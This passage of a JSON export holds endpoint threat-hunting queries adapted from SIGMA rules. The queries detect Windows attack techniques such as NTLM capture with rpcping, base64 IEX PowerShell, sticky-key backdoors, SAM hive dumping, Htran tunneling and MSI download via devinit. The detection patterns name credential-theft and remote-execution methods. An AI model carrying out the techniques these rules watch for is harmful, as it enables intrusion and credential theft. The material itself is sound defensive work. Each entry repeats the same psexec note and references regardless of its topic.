            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Launch-VsDevShell.ps1\" and (tgt.process.cmdline contains \"VsWherePath \" or tgt.process.cmdline contains \"VsInstallationPath \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1118
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Monitors for the hiding possible malicious files in the C:\\Windows\\Fonts\\ location. This folder doesn't require admin privillege to be written and executed from.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1211",
                "t1059"
            ],
            "name": "Writing Of Malicious Files To The Fonts Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"echo\" or tgt.process.cmdline contains \"copy\" or tgt.process.cmdline contains \"type\" or tgt.process.cmdline contains \"file createnew\" or tgt.process.cmdline contains \"cacls\") and tgt.process.cmdline contains \"C:\\Windows\\Fonts\\\" and (tgt.process.cmdline contains \".sh\" or tgt.process.cmdline contains \".exe\" or tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".bin\" or tgt.process.cmdline contains \".bat\" or tgt.process.cmdline contains \".cmd\" or tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".msh\" or tgt.process.cmdline contains \".reg\" or tgt.process.cmdline contains \".scr\" or tgt.process.cmdline contains \".ps\" or tgt.process.cmdline contains \".vb\" or tgt.process.cmdline contains \".jar\" or tgt.process.cmdline contains \".pl\" or tgt.process.cmdline contains \".inf\" or tgt.process.cmdline contains \".cpl\" or tgt.process.cmdline contains \".hta\" or tgt.process.cmdline contains \".msi\" or tgt.process.cmdline contains \".vbs\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1119
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of malicious OneNote documents that contain embedded scripts.\nWhen a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "OneNote.EXE Execution of Malicious Embedded Scripts",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\onenote.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") and (tgt.process.cmdline contains \"\\exported\\\" or tgt.process.cmdline contains \"\\onenoteofflinecache_files\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1120
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using Rpcping.exe to send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Capture Credentials with Rpcping.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\rpcping.exe\" and (tgt.process.cmdline contains \"-s\" or tgt.process.cmdline contains \"/s\" or tgt.process.cmdline contains \"\u2013s\" or tgt.process.cmdline contains \"\u2014s\" or tgt.process.cmdline contains \"\u2015s\") and (((tgt.process.cmdline contains \"-u\" or tgt.process.cmdline contains \"/u\" or tgt.process.cmdline contains \"\u2013u\" or tgt.process.cmdline contains \"\u2014u\" or tgt.process.cmdline contains \"\u2015u\") and (tgt.process.cmdline contains \"NTLM\")) or ((tgt.process.cmdline contains \"-t\" or tgt.process.cmdline contains \"/t\" or tgt.process.cmdline contains \"\u2013t\" or tgt.process.cmdline contains \"\u2014t\" or tgt.process.cmdline contains \"\u2015t\") and (tgt.process.cmdline contains \"ncacn_np\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1121
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Powershell Token Obfuscation - Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline matches \"\\\\w+`(\\\\w+|-|.)`[\\\\w+|\\\\s]\" or tgt.process.cmdline matches \"\"(\\\\{\\\\d\\\\})+\"\\\\s*-f\" or tgt.process.cmdline matches \"(?i)\\\\$\\\\{`?e`?n`?v`?:`?p`?a`?t`?h`?\\\\}\") and (not tgt.process.cmdline contains \"${env:path}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1122
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Chromium based browser in headless mode",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Browser Execution In Headless Mode",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--headless\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1123
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"ssh.exe\" binary as a proxy to launch other programs.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Program Executed Using Proxy/Local Command Via SSH.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\Windows\\System32\\OpenSSH\\sshd.exe\" or (tgt.process.image.path contains \"\\ssh.exe\" and (tgt.process.cmdline contains \"ProxyCommand=\" or (tgt.process.cmdline contains \"PermitLocalCommand\" and tgt.process.cmdline contains \"LocalCommand\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1124
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Sticky Key Like Backdoor Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\winlogon.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wt.exe\") and (tgt.process.cmdline contains \"sethc.exe\" or tgt.process.cmdline contains \"utilman.exe\" or tgt.process.cmdline contains \"osk.exe\" or tgt.process.cmdline contains \"Magnify.exe\" or tgt.process.cmdline contains \"Narrator.exe\" or tgt.process.cmdline contains \"DisplaySwitch.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1125
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "PowerShell Base64 Encoded IEX Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"SUVYIChb\" or tgt.process.cmdline contains \"lFWCAoW\" or tgt.process.cmdline contains \"JRVggKF\" or tgt.process.cmdline contains \"aWV4IChb\" or tgt.process.cmdline contains \"lleCAoW\" or tgt.process.cmdline contains \"pZXggKF\" or tgt.process.cmdline contains \"aWV4IChOZX\" or tgt.process.cmdline contains \"lleCAoTmV3\" or tgt.process.cmdline contains \"pZXggKE5ld\" or tgt.process.cmdline contains \"SUVYIChOZX\" or tgt.process.cmdline contains \"lFWCAoTmV3\" or tgt.process.cmdline contains \"JRVggKE5ld\" or tgt.process.cmdline contains \"SUVYKF\" or tgt.process.cmdline contains \"lFWChb\" or tgt.process.cmdline contains \"JRVgoW\" or tgt.process.cmdline contains \"aWV4KF\" or tgt.process.cmdline contains \"lleChb\" or tgt.process.cmdline contains \"pZXgoW\" or tgt.process.cmdline contains \"aWV4KE5ld\" or tgt.process.cmdline contains \"lleChOZX\" or tgt.process.cmdline contains \"pZXgoTmV3\" or tgt.process.cmdline contains \"SUVYKE5ld\" or tgt.process.cmdline contains \"lFWChOZX\" or tgt.process.cmdline contains \"JRVgoTmV3\" or tgt.process.cmdline contains \"SUVYKCgn\" or tgt.process.cmdline contains \"lFWCgoJ\" or tgt.process.cmdline contains \"JRVgoKC\" or tgt.process.cmdline contains \"aWV4KCgn\" or tgt.process.cmdline contains \"lleCgoJ\" or tgt.process.cmdline contains \"pZXgoKC\") or (tgt.process.cmdline contains \"SQBFAFgAIAAoAFsA\" or tgt.process.cmdline contains \"kARQBYACAAKABbA\" or tgt.process.cmdline contains \"JAEUAWAAgACgAWw\" or tgt.process.cmdline contains \"aQBlAHgAIAAoAFsA\" or tgt.process.cmdline contains \"kAZQB4ACAAKABbA\" or tgt.process.cmdline contains \"pAGUAeAAgACgAWw\" or tgt.process.cmdline contains \"aQBlAHgAIAAoAE4AZQB3A\" or tgt.process.cmdline contains \"kAZQB4ACAAKABOAGUAdw\" or tgt.process.cmdline contains \"pAGUAeAAgACgATgBlAHcA\" or tgt.process.cmdline contains \"SQBFAFgAIAAoAE4AZQB3A\" or tgt.process.cmdline contains \"kARQBYACAAKABOAGUAdw\" or tgt.process.cmdline contains \"JAEUAWAAgACgATgBlAHcA\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1126
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "HackTool - Htran/NATBypass Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\htran.exe\" or tgt.process.image.path contains \"\\lcx.exe\") or (tgt.process.cmdline contains \".exe -tran \" or tgt.process.cmdline contains \".exe -slave \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1127
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Wscript Shell Run In CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Wscript.\" and tgt.process.cmdline contains \".Shell\" and tgt.process.cmdline contains \".Run\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1128
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a certain command line flag combination used by \"devinit.exe\", which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows system",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Arbitrary MSI Download Via Devinit.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -t msi-install \" and tgt.process.cmdline contains \" -i http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1129
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential use of an SSH utility to establish RDP over a reverse SSH Tunnel. This can be used by attackers to enable routing of network packets that would otherwise not reach their intended destination.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "Potential Remote Desktop Tunneling",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \":3389\" and (tgt.process.cmdline contains \" -L \" or tgt.process.cmdline contains \" -P \" or tgt.process.cmdline contains \" -R \" or tgt.process.cmdline contains \" -pw \" or tgt.process.cmdline contains \" -ssh \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1130
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587"
            ],
            "name": "Potential PsExec Remote Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"accepteula\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" \\\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1131
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Suspicious Reg Add Open Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"hkcu\\software\\classes\\ms-settings\\shell\\open\\command\" and tgt.process.cmdline contains \"/ve \" and tgt.process.cmdline contains \"/d\") or (tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"hkcu\\software\\classes\\ms-settings\\shell\\open\\command\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"DelegateExecute\") or (tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"delete\" and tgt.process.cmdline contains \"hkcu\\software\\classes\\ms-settings\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1132
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters or strings often used by crypto miners",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1496"
            ],
            "name": "Potential Crypto Mining Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
